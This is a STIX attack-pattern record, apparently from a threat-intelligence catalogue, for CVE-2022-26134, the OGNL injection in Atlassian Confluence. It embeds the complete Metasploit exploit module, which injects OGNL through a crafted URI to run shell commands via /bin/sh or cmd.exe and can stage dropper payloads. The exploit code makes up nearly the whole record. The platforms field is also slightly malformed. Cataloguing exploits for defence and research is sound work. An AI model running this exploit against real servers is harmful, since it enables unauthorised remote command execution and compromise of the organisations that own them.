{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--631c411f-3bde-48cd-91ea-de0f26ac5d6e",
    "created": "2024-08-14T17:09:08.579056Z",
    "modified": "2024-08-14T17:09:08.57906Z",
    "name": "Atlassian Confluence Namespace OGNL Injection",
    "description": " This module exploits an OGNL injection in Atlassian Confluence servers. A specially crafted URI can be used to evaluate an OGNL expression resulting in OS command execution. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/atlassian_confluence_namespace_ognl_injection.rb",
            "external_id": "atlassian_confluence_namespace_ognl_injection.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-26134"
        },
        {
            "source_name": "reference",
            "url": "https://jira.atlassian.com/browse/CONFSERVER-79000?src=confmacro"
        },
        {
            "source_name": "reference",
            "url": "https://gist.githubusercontent.com/bturner-r7/1d0b62fac85235b94f1c95cc4c03fcf3/raw/478e53b6f68b5150eefd53e0956f23d53618d250/confluence-exploit.py"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/jbaines-r7/through_the_wire"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/BH1D56ZEhs/cve-2022-26134/rapid7-analysis"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Atlassian Confluence Namespace OGNL Injection',\n        'Description' => %q{\n          This module exploits an OGNL injection in Atlassian Confluence servers. A specially crafted URI can be used to\n          evaluate an OGNL expression resulting in OS command execution.\n        },\n        'Author' => [\n          'Unknown', # exploited in the wild\n          'bturner-r7',\n          'jbaines-r7',\n          'Spencer McIntyre'\n        ],\n        'References' => [\n          ['CVE', '2022-26134'],\n          ['URL', 'https://jira.atlassian.com/browse/CONFSERVER-79000?src=confmacro'],\n          ['URL', 'https://gist.githubusercontent.com/bturner-r7/1d0b62fac85235b94f1c95cc4c03fcf3/raw/478e53b6f68b5150eefd53e0956f23d53618d250/confluence-exploit.py'],\n          ['URL', 'https://github.com/jbaines-r7/through_the_wire'],\n          ['URL', 'https://attackerkb.com/topics/BH1D56ZEhs/cve-2022-26134/rapid7-analysis']\n        ],\n        'DisclosureDate' => '2022-06-02',\n        'License' => MSF_LICENSE,\n        'Platform' => ['unix', 'linux', 'win'],\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Privileged' => false,\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :cmd\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :dropper\n            }\n          ],\n          [\n            'Windows Command',\n            {\n              'Platform' => 'win',\n              'Arch' => ARCH_CMD,\n              'Type' => :cmd\n            }\n          ],\n          [\n            'Windows Dropper',\n            {\n              'Platform' => 'win',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :dropper\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'RPORT' => 8090\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'Base path', '/'])\n    ])\n  end\n\n  def check\n    confluence_version = get_confluence_version\n    return CheckCode::Unknown unless confluence_version\n\n    vprint_status(\"Detected Confluence version: #{confluence_version}\")\n\n    confluence_platform = get_confluence_platform\n    unless confluence_platform\n      return CheckCode::Safe('Failed to test OGNL injection.')\n    end\n\n    vprint_status(\"Detected target platform: #{confluence_platform}\")\n    CheckCode::Vulnerable('Successfully tested OGNL injection.')\n  end\n\n  def get_confluence_platform\n    # this method gets the platform by exploiting CVE-2022-26134\n    return @confluence_platform if @confluence_platform\n\n    header = \"X-#{Rex::Text.rand_text_alphanumeric(10..15)}\"\n    ognl = <<~OGNL.gsub(/^\\s+/, '').tr(\"\\n\", '')\n      ${\n        Class.forName(\"com.opensymphony.webwork.ServletActionContext\")\n          .getMethod(\"getResponse\",null)\n          .invoke(null,null)\n          .setHeader(\n            \"#{header}\",\n            Class.forName(\"javax.script.ScriptEngineManager\")\n              .newInstance()\n              .getEngineByName(\"js\")\n              .eval(\"java.lang.System.getProperty('os.name')\")\n            )\n      }\n    OGNL\n    res = inject_ognl(ognl)\n    return nil unless res\n\n    res.headers[header]\n  end\n\n  def get_confluence_version\n    return @confluence_version if @confluence_version\n\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'login.action')\n    )\n    return nil unless res&.code == 200\n\n    poweredby = res.get_xml_document.xpath('//ul[@id=\"poweredby\"]/li[@class=\"print-only\"]/text()').first&.text\n    return nil unless poweredby =~ /Confluence (\\d+(\\.\\d+)*)/\n\n    @confluence_version = Rex::Version.new(Regexp.last_match(1))\n    @confluence_version\n  end\n\n  def exploit\n    confluence_platform = get_confluence_platform\n    unless confluence_platform\n      fail_with(Failure::NotVulnerable, 'The target is not vulnerable.')\n    end\n\n    unless confluence_platform.downcase.start_with?('win') == (target['Platform'] == 'win')\n      fail_with(Failure::NoTarget, \"The target platform '#{confluence_platform}' is incompatible with '#{target.name}'\")\n    end\n\n    print_status(\"Executing #{payload_instance.refname} (#{target.name})\")\n\n    case target['Type']\n    when :cmd\n      execute_command(payload.encoded)\n    when :dropper\n      execute_cmdstager\n    end\n  end\n\n  def execute_command(cmd, _opts = {})\n    header = \"X-#{Rex::Text.rand_text_alphanumeric(10..15)}\"\n    ognl = <<~OGNL.gsub(/^\\s+/, '').tr(\"\\n\", '')\n      ${\n        Class.forName(\"com.opensymphony.webwork.ServletActionContext\")\n          .getMethod(\"getResponse\",null)\n          .invoke(null,null)\n          .setHeader(\"#{header}\",\n            Class.forName(\"javax.script.ScriptEngineManager\")\n              .newInstance()\n              .getEngineByName(\"js\")\n              .eval(\"java.lang.Runtime.getRuntime().exec([\n                #{target['Platform'] == 'win' ? \"'cmd.exe','/c'\" : \"'/bin/sh','-c'\"},\n                com.opensymphony.webwork.ServletActionContext.getRequest().getHeader('#{header}')\n              ]); '#{Faker::Internet.uuid}'\")\n            )\n      }\n    OGNL\n    res = inject_ognl(ognl, 'headers' => { header => cmd })\n\n    unless res && res.headers.include?(header)\n      fail_with(Failure::PayloadFailed, \"Failed to execute command: #{cmd}\")\n    end\n\n    vprint_good(\"Successfully executed command: #{cmd}\")\n    res.headers[header]\n  end\n\n  def inject_ognl(ognl, opts = {})\n    send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, Rex::Text.uri_encode(ognl), 'dashboard.action')\n    }.merge(opts))\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-06-02",
    "x_mitre_platforms": [
        "win'"
    ]
}